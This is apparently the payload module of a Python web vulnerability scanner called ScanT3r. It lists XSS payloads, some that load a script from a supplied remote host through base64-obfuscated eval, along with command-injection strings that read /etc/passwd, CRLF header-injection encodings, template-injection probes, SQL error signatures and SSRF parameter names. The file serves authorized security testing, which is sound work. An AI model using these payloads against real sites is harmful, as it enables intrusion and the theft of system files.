__name__ = 'ScanT3r'
__author__ = 'Khaled Nassar'
__email__ = 'knassar702@gmail.com'
__version__ = '0.6#Beta'

from base64 import b64encode

class XP:
    def Setup(host=None):
        global xss_payloads
        xss_payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src=x OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','<img src=x onerror=alert(1)>',"'><img src=x onerror=alert(1)>"]
        if host:
            b = b64encode(f'var a=document.createElement("script");a.src="{host}";document.body.appendChild(a);'.encode('utf-8')).decode('utf-8').replace('=','')
            xss_payloads.append(f'"><script src={host}></script>')
            xss_payloads.append(r"javascript:eval('var a=document.createElement(\'script\');a.src=\'{host}\';document.body.appendChild(a)')".format(host=host))
            xss_payloads.append(f'"><img src=x id={b}&#61; onerror=eval(atob(this.id))>')
            xss_payloads.append(f'"><input onfocus=eval(atob(this.id)) id={b}&#61; autofocus>')
        return xss_payloads
    def Dump():
        return xss_payloads
sqli_payloads=['"',"'"]
sql_err = {'sqlite3':'sqlite3.OperationalError','MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'unkown' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'Fatal error': 'Fatal error',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'Internal Server Error':'The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application'}
rce_payloads = {
     ';id #':'gid=',
     ';cat /etc/passwd #':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
     '|id #':'gid=',
     '|cat /etc/passwd #':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
     '''
id #''':'gid=',
      '''
cat /etc/passwd #''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      '''
cat${IFS}/etc/passwd #''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      ';id':'gid=',
      ';cat /etc/passwd':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      '|id':'gid=',
      '|cat /etc/passwd':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      '''
id''':'gid=',
      '''
cat /etc/passwd''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
      '''
cat${IFS}/etc/passwd''':'bin:x:2:2:bin:/bin:/usr/sbin/nologin'
      }

crlf_payloads = [
"%0AHeader-Test:BLATRUC","%0A%20Header-Test:BLATRUC","%20%0AHeader-Test:BLATRUC","%23%OAHeader-Test:BLATRUC","%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC","%3F%0AHeader-Test:BLATRUC","crlf%0AHeader-Test:BLATRUC","crlf%0A%20Header-Test:BLATRUC","crlf%20%0AHeader-Test:BLATRUC","crlf%23%OAHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC","crlf%3F%0AHeader-Test:BLATRUC","%0DHeader-Test:BLATRUC","%0D%20Header-Test:BLATRUC","%20%0DHeader-Test:BLATRUC","%23%0DHeader-Test:BLATRUC","%23%0AHeader-Test:BLATRUC","%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC","%3F%0DHeader-Test:BLATRUC","crlf%0DHeader-Test:BLATRUC","crlf%0D%20Header-Test:BLATRUC","crlf%20%0DHeader-Test:BLATRUC","crlf%23%0DHeader-Test:BLATRUC","crlf%23%0AHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC","crlf%3F%0DHeader-Test:BLATRUC","%0D%0AHeader-Test:BLATRUC","%0D%0A%20Header-Test:BLATRUC","%20%0D%0AHeader-Test:BLATRUC","%23%0D%0AHeader-Test:BLATRUC","\r\nHeader-Test:BLATRUC"," \r\n Header-Test:BLATRUC","\r\n Header-Test:BLATRUC","%5cr%5cnHeader-Test:BLATRUC","%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC","%3F%0D%0AHeader-Test:BLATRUC","crlf%0D%0AHeader-Test:BLATRUC","crlf%0D%0A%20Header-Test:BLATRUC","crlf%20%0D%0AHeader-Test:BLATRUC","crlf%23%0D%0AHeader-Test:BLATRUC","crlf\r\nHeader-Test:BLATRUC","crlf%5cr%5cnHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC","crlf%3F%0D%0AHeader-Test:BLATRUC","%0D%0A%09Header-Test:BLATRUC","crlf%0D%0A%09Header-Test:BLATRUC","%250AHeader-Test:BLATRUC","%25250AHeader-Test:BLATRUC","%%0A0AHeader-Test:BLATRUC","%25%30AHeader-Test:BLATRUC","%25%30%61Header-Test:BLATRUC","%u000AHeader-Test:BLATRUC","//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC","/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC","/google.com/%2F..%0D%0AHeader-Test:BLATRUC"
        ]
ssti_payloads = {
    'scan{{6*6}}t3r':'scan36t3r',
    'scan${6*6}t3r':'scan36t3r',
    'scan<% 6*6 %>t3r':'scan36t3r'
    }

ssrf_parameters = ["token","redirecturl","title","parse","u","f","query","dest","redirect","uri","path","continue","url","window","next","data","reference","site","html","val","validate","domain","callback","return","page","view","dir","show","file","document","folder","root","path","pg","style","php_path","doc","feed","host","link","port","to","out"]
